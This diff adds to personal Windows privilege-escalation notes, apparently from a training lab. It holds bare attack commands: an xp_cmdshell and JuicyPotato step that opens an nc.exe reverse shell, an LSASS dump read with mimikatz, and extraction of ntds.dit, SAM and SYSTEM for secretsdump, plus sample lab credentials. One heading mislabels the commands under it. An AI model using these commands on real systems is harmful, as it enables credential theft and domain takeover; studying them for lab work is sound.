@@ -1,5 +1,32 @@
 * Enumm Enumm Enumm!
 
+$ ipcondig /all
+$ arp -a
+$ route print
+$ tasklist /svc
+$ set
+$ systeminfo
+$ netstat -ano
+$ query user
+$ echo %USERNAME%
+$ whoami /priv
+$ whoami /groups
+$ net user
+$ net localgroup
+$ net localgroup administrators
+$ net accounts
+$ wmic product get name
+$ Get-MpComputerStatus
+$ Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+$ Get-Hotfix | ft -Autosize
+$ sc qc AppReadiness
+
+* Log Reader
+$ net localgroup "Event Log Readers"
+$ wevtutil qe Security /rd:true /f:text | Select-String "/user"
+$ wevtutil qe Security /rd:true /f:text /r:share01 /u:julie.clay /p:Welcome1 | findstr "/user"
+$ Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+
 * You have to got these!
 What is the active directory domain name?
 What is the hostname of the computer being taken over?
@@ -30,6 +57,47 @@ PS C:\Temp> .\nmap.ps1 "ip" -Arguments "-sV -T4" -Verbose | Format Table
 * Prepared Impacket list: https://github.com/fortra/impacket/tree/master/examples
 impacket, getnpusers.py 
 impacket smbserver
+
+* SeImpersonate and SeAssignPrimary Token
+Connecting with MSSQLClient.py
+$ mssqlclient.py sqluser@ipadd -windows-auth
+SQL> enable_xp_cmdshell
+SQL> xp_cmdshell whoami
+SQL> xp_cmdshell dir\JuicyPotato.exe -l 523375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe iptarget 8443 -e cmd.exe" -t *
+
+* SeDebugPrivilege
+$ procdump.exe -accepteula -ma lsass.exe lsass.dmp
+$ mimikatz.exe
+> log
+> sekurlsa::minidump lsass.dmp
+> sekurlsa::logonpasswords
+
+* SeTakeOwnershipPrivilege
+$ Import-Module .\Enable-Privilege.ps1
+$ .\EnableAllTokenPrivs.ps1
+$ whoami /priv
+$ Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | Select Fullname,LastWriteTime,Attributes,@{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+$ cmd /c dir /q 'C:\Department Shares\Private\IT'
+$ takeown /f 'C:\Department Shares\Private\IT\cred.txt'
+$ Get-ChildItem -Path 'C:\Department Shares\Private\IT\cred.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
+
+* SeLoadDriverPrivilege
+
+
+$ Import-Module .\SeBackupPrivilegeUtils.dll
+$ Import-Module .\SeBackupPrivilegeCmdLets.dll
+$ Get-SeBackupPrivilege
+$ Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
+$ diskshadow.exe
+$ Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+$ reg save HKLM\SYSTEM SYSTEM.SAV
+$ reg save HKLM\SAM SAM.SAV
+$ Import-Module .\DSInternals.psd1
+$ $key = Get-BootKey -SystemHivePath .\SYSTEM
+$ Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
+$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+$ robocopy /B E:\Windows\NTDS .\ntds ntds.dit
+
 
 * Bloodhound Checks:
 pwn user 
